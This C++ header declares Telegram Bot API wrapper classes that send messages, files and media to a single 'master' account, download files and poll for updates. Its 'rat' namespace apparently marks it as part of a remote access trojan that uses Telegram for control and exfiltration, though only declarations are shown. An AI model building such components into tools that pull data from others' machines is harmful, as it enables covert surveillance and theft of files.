#pragma once

#include <limits>
#include <array>
#include <string>
#include <filesystem>
#include <cstdint>

#include <nlohmann/json.hpp>

#include "rat/networking.hpp"
#include "rat/tbot/types.hpp"

#define KB 1024

#define TELEGRAM_BOT_API_MESSAGE_RESPONSE_BUFFER_SIZE      (4 * KB)
#define TELEGRAM_BOT_API_FILE_OPERATION_RESPONSE_BUFFER_SIZE (8 * KB)
#define TELEGRAM_BOT_API_UPDATE_BUFFER_SIZE                (64 * KB)

#define TELEGRAM_BOT_API_BASE_URL "https://api.telegram.org/bot"
#define TELEGRAM_API_URL          "https://api.telegram.org"

namespace rat::tbot {

using MessageResponseBuffer       = std::array<char, TELEGRAM_BOT_API_MESSAGE_RESPONSE_BUFFER_SIZE>;
using FileOperationResponseBuffer = std::array<char, TELEGRAM_BOT_API_FILE_OPERATION_RESPONSE_BUFFER_SIZE>;
using UpdateBuffer                = std::array<char, TELEGRAM_BOT_API_UPDATE_BUFFER_SIZE>;

class BaseBot {

private:
    std::string token;
    int64_t master_id;
    int64_t last_update_id;
    uint16_t update_interval;

    std::string sending_message_url_base;
    std::string sending_document_url;
    std::string sending_photo_url;
    std::string sending_audio_url;
    std::string sending_video_url;
    std::string sending_voice_url;

    std::string getting_file_url;

public:
    /* This is because the bot gets copied inside certain threads, use its client to limit creating another handler */
    rat::networking::Client curl_client;

    // Constructors
    BaseBot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timeout = 20);
    BaseBot(const BaseBot& Other_Bot); // constructs new Client with its own CURL handle, copies everything, very expensive

    // Getters
    std::string getToken() const;
    int64_t getMasterId() const;
    int64_t getLastUpdateId() const;

    void setOffset(); // only for bots handling updates, not for sender-only bots

    std::string getBotFileUrl() const;
    void setUpdateIterval(uint16_t Update_Interval);
    
    void setLastUpdateId(int64_t arg_Id) ; 
    // Sending methods
    BotResponse sendMessage(const std::string& Text_Message);
    BotResponse sendMessage(const char* Text_Message);

    BotResponse sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption = "");
    BotResponse sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption = "");
    BotResponse sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption = "");
    BotResponse sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption = "");
    BotResponse sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption = "");

    bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path);
};

/* This is the bot that listens for updates and parses them */
class Bot : public BaseBot {

private: 
    std::string getting_update_url;
    
public:
    Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timeout = 20);

    Update getUpdate(); // override if BaseBot has virtual equivalent
};
} // namespace rat::tbot


